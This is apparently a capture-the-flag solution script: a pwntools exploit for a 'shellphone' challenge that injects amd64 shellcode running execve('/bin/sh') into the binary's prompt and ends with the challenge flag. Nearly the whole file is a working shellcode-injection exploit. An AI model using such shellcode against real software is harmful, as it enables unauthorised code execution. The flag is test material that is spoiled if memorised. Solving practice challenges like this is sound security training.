from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./shellphone', '''
    b *0x40116e
    continue
''')

# p = remote('52.8.15.62', 8006)

# shellcode injection to execute execve("/bin/sh", NULL, NULL)
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f6e69622f
    push rdi
    push rsp
    pop rdi
    xor rdx, rdx
    mov al, 0x3b
    syscall
''', arch='amd64')
p.sendlineafter(b'giv me sm shllcde & i\'ll run it. keep it shrt!', shellcode)

p.interactive()

# sdctf{omg_i_luv_shlcd}